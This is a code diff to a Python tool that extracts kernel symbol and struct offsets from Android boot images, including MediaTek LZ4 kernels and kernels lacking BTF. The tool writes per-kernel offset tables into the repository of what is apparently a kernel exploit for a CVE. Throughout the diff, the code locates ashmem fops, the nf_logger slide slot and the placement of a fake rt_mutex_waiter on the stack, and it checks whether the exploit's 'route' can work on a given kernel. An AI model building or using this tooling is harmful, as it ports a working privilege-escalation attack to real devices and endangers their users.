@@ -158,10 +158,38 @@ def recover_kernel_phys_load(path: Path) -> int:
     return next(iter(candidates))[2]
 
 
+LZ4_LEGACY_MAGIC = b"\x02\x21\x4c\x18"
+LZ4_MAX_IMAGE = 0x10000000  # 256 MiB upper bound for a decompressed arm64 Image
+
+# MediaTek loads the kernel at the DRAM base (arm64 text_offset=0); DRAM
+# starts at 0x80000000 on its current flagship platforms, so this is the
+# assumed load address when neither xbl_config nor --phys is available.
+MTK_DEFAULT_PHYS_LOAD = 0x80000000
+
+
+def decompress_lz4_legacy(payload: bytes) -> bytes:
+    """MediaTek boot images store the kernel as an LZ4 legacy frame."""
+    try:
+        import lz4.block
+    except ImportError as exc:
+        raise ExtractError(
+            "MediaTek kernels are LZ4-compressed; install the lz4 module "
+            "(pip install lz4)"
+        ) from exc
+    try:
+        out = lz4.block.decompress(payload[8:], uncompressed_size=LZ4_MAX_IMAGE)
+    except Exception as exc:
+        raise ExtractError(f"invalid LZ4-compressed kernel payload: {exc}") from exc
+    if out[:2] != b"MZ" or out[0x38:0x3C] != b"ARM\x64":
+        raise ExtractError("LZ4 decompression did not yield an arm64 Image")
+    return out
+
+
 @dataclass
 class BootImage:
     path: Path
     kernel: bytes
+    mtk_lz4: bool = False
 
     @classmethod
     def load(cls, path: Path) -> "BootImage":
@@ -180,7 +208,11 @@ class BootImage:
             end = start + kernel_size
             if end > len(raw):
                 raise ExtractError("kernel payload exceeds boot image")
-            return cls(path, raw[start:end])
+            kernel = raw[start:end]
+            if kernel[:4] == LZ4_LEGACY_MAGIC:
+                kernel = decompress_lz4_legacy(kernel)
+                return cls(path, kernel, True)
+            return cls(path, kernel)
         if raw[:3] == b"\x1f\x8b\x08":
             try:
                 raw = gzip.decompress(raw)
@@ -510,9 +542,8 @@ ASHMEM_FUNCTIONS = {
     "off_ashmem_show_fdinfo": ("ashmem_show_fdinfo", "fops_show_fdinfo"),
 }
 
-# Slot offsets of ashmem function pointers within struct file_operations.
-# The classic C layout (OPPO 6.6) and the 6.12+ Rust ashmem vtable differ by
-# one 8-byte field before unlocked_ioctl; both observed on real devices.
+# file_operations slot offsets: classic C layout (OPPO 6.6) vs 6.12+ Rust
+# vtable, which differ by one 8-byte field before unlocked_ioctl.
 ASHMEM_FOPS_LAYOUTS = (
     {
         "off_ashmem_ioctl": 0x50,
@@ -533,9 +564,8 @@ ASHMEM_FOPS_LAYOUTS = (
 )
 
 
-# Fields that may legitimately be absent from a kernel's kallsyms (e.g. GKI
-# drops some data symbols). Missing optional fields are emitted as 0, which
-# makes the runtime fall back to the target.h default.
+# GKI kernels drop some data symbols; unresolved optionals emit 0 and the
+# runtime falls back to target.h defaults.
 OPTIONAL_SYMBOLS = {
     "off_security_hook_heads",
     "off_ashmem_fops",
@@ -579,7 +609,8 @@ STRUCT_FIELDS = {
 
 
 def resolve_symbols(
-    symbols: dict[str, set[int]], types: dict[str, set[str]], btf: Btf, base: int
+    symbols: dict[str, set[int]], types: dict[str, set[str]],
+    btf: Btf | None, base: int, release: str | None,
 ) -> dict[str, int | None]:
     result: dict[str, int | None] = {}
     for name, (symbol,) in SYMBOLS.items():
@@ -590,7 +621,10 @@ def resolve_symbols(
         unique(symbols, "loggers") + 0x10 if unique(symbols, "loggers") is not None else None
     )
     misc = find_data_symbol(symbols, types, "ashmem_misc", ("ashmem", "misc"))
-    misc_fops = btf.field("miscdevice", "fops")
+    misc_fops = btf.field("miscdevice", "fops") if btf else None
+    if misc_fops is None and btf is None and kernel_struct_macro(release) == "STRUCT_OFFSETS_6_6":
+        # No BTF: miscdevice.fops is at 0x10 on 6.6 (after minor/name).
+        misc_fops = 0x10
     result["off_ashmem_misc_fops"] = (
         misc + misc_fops if misc is not None and misc_fops is not None else None
     )
@@ -612,13 +646,10 @@ def resolve_symbols(
 def scan_ashmem_fops(
     kernel: bytes, base: int, resolved: dict[str, int | None]
 ) -> int | None:
-    """Locate the ashmem struct file_operations by scanning the kernel image
-    for a struct whose slots point to the resolved ashmem functions.
-
-    Rust (6.12+) ashmem exposes no kallsyms data symbol for its fops, so this
-    pattern scan is the only reliable way to resolve off_ashmem_fops there.
-    Returns the offset from _text, or None when not uniquely found.
-    """
+    """Scan for a file_operations whose slots point at the resolved ashmem
+    functions; 6.12+ Rust ashmem exposes no kallsyms data symbol, so this is
+    the only reliable way to resolve off_ashmem_fops there.
+    Returns the _text-relative offset, or None when not unique."""
     candidates: set[int] = set()
     for layout in ASHMEM_FOPS_LAYOUTS:
         slots = [
@@ -647,15 +678,10 @@ def scan_ashmem_fops(
 
 
 
-# ---------------------------------------------------------------------------
-# llvm-objdump disassembly: auto-derive pselect_waiter_shift and the
-# nf_logger slide slot.  Ported from Linuxoid-cn/CVE-2026-43499-Poc-Analysis
-# generate_target.py (derive_pselect_layout / derive_nf_logger_registration).
-#
-# Kernel Image note: the arm64 Image is a PE/COFF file whose section raw
-# offsets equal their virtual addresses, so llvm-objdump addresses equal the
-# base-relative kallsyms offsets (raw_ptr == vaddr == RVA).
-# ---------------------------------------------------------------------------
+# llvm-objdump auto-derives pselect_waiter_shift and the nf_logger slide slot
+# (ported from Linuxoid-cn/CVE-2026-43499-Poc-Analysis generate_target.py).
+# arm64 Image is PE/COFF, so objdump addresses equal base-relative kallsyms
+# offsets (raw == vaddr == RVA).
 
 PSELECT_ROUTE_NFDS = 320
 OBJDUMP_CAP = 0x2000
@@ -797,15 +823,9 @@ def derive_pselect_layout(
     btf: Btf,
     route_nfds: int,
 ) -> dict[str, int]:
-    """Derive the pselect/futex waiter word shift from disassembly.
-
-    Handles both call chains:
-      __arm64_sys_pselect6 -> core_sys_select                 (do_pselect inlined)
-      __arm64_sys_pselect6 -> do_pselect -> core_sys_select   (6.6 middle layer)
-    and both futex dispatch styles:
-      __arm64_sys_futex -> do_futex -> futex_wait_requeue_pi  (classic)
-      __arm64_sys_futex -> futex_wait_requeue_pi              (direct dispatch)
-    """
+    """Derive the pselect/futex waiter word shift from disassembly, handling
+    both pselect chains (inlined or via do_pselect) and both futex dispatch
+    styles (via do_futex or direct)."""
     names = {
         "pselect_wrapper": "__arm64_sys_pselect6",
         "pselect_core": "core_sys_select",
@@ -869,21 +889,34 @@ def derive_pselect_layout(
         )
     frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}
 
-    pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
-    wake_state = btf.field("rt_mutex_waiter", "wake_state")
-    if pi_tree is None or wake_state is None:
-        raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
+    pi_tree = wake_state = None
+    if btf is not None:
+        pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
+        wake_state = btf.field("rt_mutex_waiter", "wake_state")
+        if pi_tree is None or wake_state is None:
+            raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
     waiter_candidates: list[tuple[str, int]] = []
     for reg, imm_text in re.findall(
         r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
     ):
         imm = int(imm_text, 16)
-        if re.search(
-            rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
+        if pi_tree is not None:
+            if re.search(
+                rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
+                dis["futex_wait"], re.I,
+            ):
+                waiter_candidates.append((reg.lower(), imm))
+        elif re.search(
+            rf"\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]",
             dis["futex_wait"], re.I,
         ):
+            # No BTF: the waiter is memset before use, so its sp slot must
+            # start a stp xzr run; require that.
             waiter_candidates.append((reg.lower(), imm))
-    waiter_candidates = list(dict.fromkeys(waiter_candidates))
+    # Several registers may materialize the same sp local; dedupe by offset.
+    waiter_candidates = list(
+        {imm: (reg, imm) for reg, imm in waiter_candidates}.values()
+    )
     if len(waiter_candidates) != 1:
         raise ExtractError(
             f"futex waiter stack local not unique: {waiter_candidates}"
@@ -894,7 +927,10 @@ def derive_pselect_layout(
         rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
         names["futex_wait"],
     )
-    for required in (waiter_local, waiter_local + wake_state):
+    required_fields = [waiter_local]
+    if wake_state is not None:
+        required_fields.append(waiter_local + wake_state)
+    for required in required_fields:
         if not re.search(rf"\[sp,\s*#0x{required:x}\]", dis["futex_wait"], re.I):
             raise ExtractError(
                 f"futex waiter candidate 0x{waiter_local:x} not cross-validated "
@@ -960,12 +996,9 @@ def derive_pselect_layout(
         raise InfeasibleError(
             f"PSELECT_WAITER_WORD_SHIFT too large: {shift}"
         )
-    # Feasibility (ghostlock-oneplus rule): core_sys_select copies only
-    # 3 x FDS_BYTES(route_nfds) bytes of user fd_set data onto the stack,
-    # i.e. global words 0..14 for route_nfds=320.  The fake rt_mutex_waiter
-    # starts at pselect word `shift`, and its lock field is at waiter
-    # qword 11, so shift + 11 must stay <= 14 or task/lock land in the
-    # kernel-zeroed tail of stack_fds and the route can never work.
+    # Feasibility: core_sys_select copies 3 x FDS_BYTES(route_nfds) fd_set
+    # qwords (0..14 for nfds=320); the waiter lock at qword shift+11 must fit
+    # inside, else task/lock land in the zeroed tail and the route cannot work.
     if shift > 3:
         raise InfeasibleError(
             f"futex waiter starts {shift} qwords above the fd_set buffer; "
@@ -1041,13 +1074,11 @@ def derive_nf_logger_registration(
     kernel: bytes,
     symbols: dict[str, set[int]],
     sorted_offsets: list[int],
-    btf: Btf,
+    btf: Btf | None,
 ) -> dict[str, int]:
-    """Derive loggers[0][NF_LOG_TYPE_ULOG] and validate nfulnl_logger.
-
-    Disassembles nf_log_register/nfnetlink_log_init and closes the slot index
-    against BTF nf_logger.type / NF_LOG_TYPE_ULOG / NFPROTO_UNSPEC.
-    """
+    """Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling
+    nf_log_register/nfnetlink_log_init and closing the slot index against BTF
+    nf_logger.type / NF_LOG_TYPE_ULOG / NFPROTO_UNSPEC."""
     register_text = disassemble_symbol(
         tool, kernel_path, symbols, sorted_offsets, "nf_log_register", 0x800
     )
@@ -1140,8 +1171,18 @@ def derive_nf_logger_registration(
 
 
 
-def resolve_structs(btf: Btf) -> dict[str, int | None]:
+def resolve_structs(btf: Btf | None) -> dict[str, int | None]:
     result: dict[str, int | None] = {}
+    if btf is None:
+        for fields in STRUCT_FIELDS.values():
+            for macro in fields:
+                result[macro] = None
+        result["struct_page_size"] = None
+        result["struct_page_compound_head"] = None
+        result["struct_page_type"] = None
+        result["struct_slab_cache"] = None
+        result["struct_mm_struct"] = None
+        return result
     for struct_name, fields in STRUCT_FIELDS.items():
         if btf.struct(struct_name) is None:
             for macro in fields:
@@ -1204,11 +1245,21 @@ def require_fields(values: dict[str, int | None], optional: set[str]) -> None:
         raise ExtractError("missing required values: " + ", ".join(sorted(missing)))
 
 
-DEVICE_ROOT = Path(__file__).resolve().parent.parent / "src" / "devices"
+KERNEL_ROOT = Path(__file__).resolve().parent.parent / "src" / "kernels"
 
 
-def device_header_path(name: str) -> Path:
-    return DEVICE_ROOT / name / "offsets.h"
+def kernel_key(release: str | None) -> str:
+    """Directory name for a kernel table: the full uname release.
+
+    Using the exact runtime match key avoids collisions between builds that
+    share a version+hash but differ in build id (e.g. -abogki... vs -ab13...).
+    """
+    return re.sub(r"[^A-Za-z0-9._-]", "_", release or "unknown")
+
+
+def kernel_header_path(key: str) -> Path:
+    return KERNEL_ROOT / key / "offsets.h"
+
 
 
 def kernel_struct_macro(release: str | None) -> str:
@@ -1221,11 +1272,9 @@ def kernel_struct_macro(release: str | None) -> str:
 
 
 def pselect_waiter_shift_for(release: str | None) -> int:
-    """Heuristic fallback only: 6.12 GKI places the waiter at word 0 (shift
-    -2 in our layout), 6.6 OPPO at word -2 (shift -2 too).  Not reliable for
-    kernels with a non-inlined do_pselect middle layer (e.g. some 6.6.77
-    builds put the waiter 12 words up, which is infeasible); prefer
-    --llvm-objdump derivation."""
+    """Fallback when --llvm-objdump is unavailable: 6.12 -> 0, 6.6 -> -2.
+    Unreliable for kernels with a non-inlined do_pselect middle layer (e.g.
+    some 6.6.77 builds put the waiter 12 words up, which is infeasible)."""
     return 0 if kernel_struct_macro(release) == "STRUCT_OFFSETS_6_12" else -2
 
 
@@ -1264,9 +1313,9 @@ def render_device(
 
 
 def existing_entries() -> dict[str, dict[str, int]]:
-    """Map each registered release to its {field: value} from device headers."""
+    """Map each registered release to its {field: value} from kernel headers."""
     entries: dict[str, dict[str, int]] = {}
-    for header in sorted(DEVICE_ROOT.glob("*/offsets.h")):
+    for header in sorted(KERNEL_ROOT.glob("*/offsets.h")):
         text = header.read_text(encoding="utf-8", errors="replace")
         for match in re.finditer(r'OFFSETS_ENTRY\(\s*"([^"]+)"', text):
             release = match.group(1)
@@ -1306,11 +1355,11 @@ def warn_existing_mismatches(
                 )
 
 
-def register_device(name: str) -> Path:
-    """Add #include "<name>/offsets.h" to src/devices/offsets.h if missing."""
-    header = DEVICE_ROOT / "offsets.h"
+def register_kernel(key: str) -> Path:
+    """Add #include "<key>/offsets.h" to src/kernels/offsets.h if missing."""
+    header = KERNEL_ROOT / "offsets.h"
     text = header.read_text(encoding="utf-8")
-    include = f'#include "{name}/offsets.h"'
+    include = f'#include "{key}/offsets.h"'
     if include in text:
         return header
     marker = re.search(r"^\s*\{\s*\.uname_r\s*=\s*NULL", text, re.MULTILINE)
@@ -1353,10 +1402,28 @@ def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[
 
 
 def main(argv: list[str] | None = None) -> int:
-    parser = argparse.ArgumentParser(description=__doc__)
+    parser = argparse.ArgumentParser(
+        description=__doc__,
+        epilog=(
+            "examples:\n"
+            "  %(prog)s boot.img --kallsyms kallsyms.txt\n"
+            "  %(prog)s boot.img --xbl-config xbl_config.img --register\n"
+            "  %(prog)s boot.img --llvm-objdump llvm-objdump.exe --register\n"
+            "  %(prog)s boot.img --format c --out offsets.h --name device"
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
     parser.add_argument("image", type=Path, help="boot.img, raw arm64 Image, or gzip Image")
-    parser.add_argument("--kallsyms", type=Path)
-    parser.add_argument("--kallsyms-finder")
+    parser.add_argument(
+        "--kallsyms", type=Path,
+        help="kallsyms text file (e.g. dumped from /proc/kallsyms); "
+        "skips running kallsyms-finder",
+    )
+    parser.add_argument(
+        "--kallsyms-finder",
+        help="path to the kallsyms-finder executable; auto-detected via PATH "
+        "when omitted (installed by the vmlinux-to-elf pip package)",
+    )
     parser.add_argument(
         "--llvm-objdump",
         help="path to llvm-objdump; auto-derive pselect_waiter_shift and the "
@@ -1368,12 +1435,25 @@ def main(argv: list[str] | None = None) -> int:
         type=Path,
         help="optional XBL xbl_config.img; derive kernel physical load address from its FDT",
     )
-    parser.add_argument("--name", default="target")
-    parser.add_argument("--format", choices=("text", "json", "c"), default="text")
     parser.add_argument(
-        "--device",
-        type=str,
-        help="render and register src/devices/<name>/offsets.h (repo format)",
+        "--phys",
+        type=lambda x: int(x, 0),
+        help="kernel physical load address; overrides the MediaTek LZ4 "
+        "default (0x80000000) and is used when there is no --xbl-config",
+    )
+    parser.add_argument(
+        "--name", default="target",
+        help="device name used in the --format c output header",
+    )
+    parser.add_argument(
+        "--format", choices=("text", "json", "c"), default="text",
+        help="output format: text (default), json, or c",
+    )
+    parser.add_argument(
+        "--register",
+        action="store_true",
+        help="register the kernel table in the repo under "
+        "src/kernels/<release>/offsets.h (repo format)",
     )
     parser.add_argument(
         "--allow-missing",
@@ -1385,20 +1465,35 @@ def main(argv: list[str] | None = None) -> int:
         action="store_true",
         help="overwrite an existing device header that differs",
     )
-    parser.add_argument("--out", type=Path)
+    parser.add_argument("--out", type=Path, help="write output to a file instead of stdout")
     args = parser.parse_args(argv)
+    if args.register and args.out is not None:
+        parser.error("--register cannot be combined with --out")
 
     try:
         boot = BootImage.load(args.image)
-        args.kernel_phys_load = (
-            recover_kernel_phys_load(args.xbl_config)
-            if args.xbl_config is not None
-            else None
-        )
+        if args.xbl_config is not None:
+            args.kernel_phys_load = recover_kernel_phys_load(args.xbl_config)
+        elif args.phys is not None:
+            args.kernel_phys_load = args.phys
+        elif boot.mtk_lz4:
+            args.kernel_phys_load = MTK_DEFAULT_PHYS_LOAD
+            print(
+                "info: MediaTek LZ4 image; assuming kernel_phys_load="
+                f"0x{MTK_DEFAULT_PHYS_LOAD:x} (DRAM base; pass --phys to "
+                "override)",
+                file=sys.stderr,
+            )
+        else:
+            args.kernel_phys_load = None
         btf_raw = boot.embedded_btf()
-        if btf_raw is None:
-            raise ExtractError("embedded BTF not found")
-        btf = Btf(btf_raw)
+        btf = Btf(btf_raw) if btf_raw is not None else None
+        if btf is None:
+            print(
+                "warning: embedded BTF not found; symbols come from kallsyms "
+                "and struct offsets fall back to target.h defaults",
+                file=sys.stderr,
+            )
         kallsyms_path, owned_kallsyms = find_kallsyms(
             args.image, args.kallsyms, args.kallsyms_finder
         )
@@ -1410,7 +1505,9 @@ def main(argv: list[str] | None = None) -> int:
         base = unique(symbols, "_text") or unique(symbols, "_head")
         if base is None:
             raise ExtractError("_text/_head is not unique in kallsyms")
-        symbol_offsets = resolve_symbols(symbols, types, btf, base)
+        symbol_offsets = resolve_symbols(
+            symbols, types, btf, base, boot.release()
+        )
         if symbol_offsets.get("off_ashmem_fops") is None:
             scanned = scan_ashmem_fops(boot.kernel, base, symbol_offsets)
             if scanned is not None:
@@ -1422,7 +1519,14 @@ def main(argv: list[str] | None = None) -> int:
                 )
         derived: dict[str, int] = {}
         objdump = find_llvm_objdump(args.llvm_objdump)
-        if objdump is not None:
+        if objdump is None:
+            print(
+                "warning: llvm-objdump not found; pselect_waiter_shift and "
+                "loggers_0_1 fall back to heuristics "
+                "(pass --llvm-objdump to enable auto-derivation)",
+                file=sys.stderr,
+            )
+        else:
             with tempfile.TemporaryDirectory(prefix="ghostlock-disasm-") as tmp:
                 kernel_path = Path(tmp) / "kernel.bin"
                 kernel_path.write_bytes(boot.kernel)
@@ -1444,9 +1548,8 @@ def main(argv: list[str] | None = None) -> int:
                         file=sys.stderr,
                     )
                 else:
-                    # Linuxoid's fops waiter words start at index 0; ours
-                    # (and ghostlock-oneplus) start at index 2, so the shift
-                    # for our layout is the derived value minus 2.
+                    # Linuxoid indexes waiter words from 0, ours from 2:
+                    # our shift = derived value - 2.
                     derived["pselect_waiter_shift"] = (
                         pselect["PSELECT_WAITER_WORD_SHIFT"] - 2
                     )
@@ -1465,32 +1568,32 @@ def main(argv: list[str] | None = None) -> int:
                         f"(derived {pselect['PSELECT_WAITER_WORD_SHIFT']} - 2)",
                         file=sys.stderr,
                     )
-                try:
-                    logger_info = derive_nf_logger_registration(
-                        objdump, kernel_path, boot.kernel,
-                        rel_symbols, sorted_offsets, btf,
-                    )
-                except ExtractError as exc:
+                if btf is None:
                     print(
-                        f"warning: loggers_0_1 derivation failed: {exc}",
+                        "warning: no BTF; loggers_0_1 falls back to the "
+                        "loggers+0x10 heuristic",
                         file=sys.stderr,
                     )
                 else:
-                    derived["off_slide_loggers_0_1"] = logger_info["loggers_0_1"]
-                    print(
-                        f"info: nf_logger loggers=0x{logger_info['loggers']:x} "
-                        f"nfulnl_logger=0x{logger_info['nfulnl_logger']:x} "
-                        f"ulog={logger_info['nf_log_type_ulog']} "
-                        f"slot=0x{logger_info['loggers_0_1']:x}",
-                        file=sys.stderr,
-                    )
-        else:
-            print(
-                "warning: llvm-objdump not found; pselect_waiter_shift and "
-                "loggers_0_1 fall back to heuristics "
-                "(pass --llvm-objdump to enable auto-derivation)",
-                file=sys.stderr,
-            )
+                    try:
+                        logger_info = derive_nf_logger_registration(
+                            objdump, kernel_path, boot.kernel,
+                            rel_symbols, sorted_offsets, btf,
+                        )
+                    except ExtractError as exc:
+                        print(
+                            f"warning: loggers_0_1 derivation failed: {exc}",
+                            file=sys.stderr,
+                        )
+                    else:
+                        derived["off_slide_loggers_0_1"] = logger_info["loggers_0_1"]
+                        print(
+                            f"info: nf_logger loggers=0x{logger_info['loggers']:x} "
+                            f"nfulnl_logger=0x{logger_info['nfulnl_logger']:x} "
+                            f"ulog={logger_info['nf_log_type_ulog']} "
+                            f"slot=0x{logger_info['loggers_0_1']:x}",
+                            file=sys.stderr,
+                        )
         pselect_shift = derived.get(
             "pselect_waiter_shift", pselect_waiter_shift_for(boot.release())
         )
@@ -1525,7 +1628,8 @@ def main(argv: list[str] | None = None) -> int:
                     file=sys.stderr,
                 )
         require_fields(symbol_offsets, set())
-        require_fields(struct_offsets, set())
+        if btf is not None:
+            require_fields(struct_offsets, set())
         mm_size = struct_offsets.get("struct_mm_struct")
         if mm_size is not None:
             print(
@@ -1545,30 +1649,40 @@ def main(argv: list[str] | None = None) -> int:
             "kernel_phys_load": args.kernel_phys_load,
             "symbols": symbol_offsets,
             "struct_fields": struct_offsets,
-            "btf_size": len(btf_raw),
+            "btf_size": len(btf_raw) if btf_raw is not None else 0,
         }
-        if args.device:
+        if args.register:
+            release = boot.release()
+            key = kernel_key(release)
+            if release in existing_entries():
+                # Same kernel already registered: keep one table.
+                warn_existing_mismatches(release, symbol_offsets)
+                if kernel_header_path(key).exists():
+                    print(
+                        f"info: {release} already registered; "
+                        "no duplicate table created",
+                        file=sys.stderr,
+                    )
+                    return 0
             output = render_device(
-                boot.release(), symbol_offsets, struct_offsets,
+                release, symbol_offsets, struct_offsets,
                 args.kernel_phys_load, pselect_shift,
             )
-            target = args.out or device_header_path(args.device)
+            target = kernel_header_path(key)
             if (
-                args.out is None
-                and target.exists()
+                target.exists()
                 and target.read_text(encoding="utf-8") != output
                 and not args.force
             ):
                 raise ExtractError(
                     f"{target} already exists and differs; pass --force to "
-                    "overwrite or --out to write elsewhere"
+                    "overwrite"
                 )
             target.parent.mkdir(parents=True, exist_ok=True)
             target.write_text(output, encoding="utf-8")
             print(f"wrote {target}", file=sys.stderr)
-            if args.out is None:
-                register_device(args.device)
-            warn_existing_mismatches(boot.release(), symbol_offsets)
+            register_kernel(key)
+            warn_existing_mismatches(release, symbol_offsets)
             return 0
         if args.format == "c":
             output = render_c(
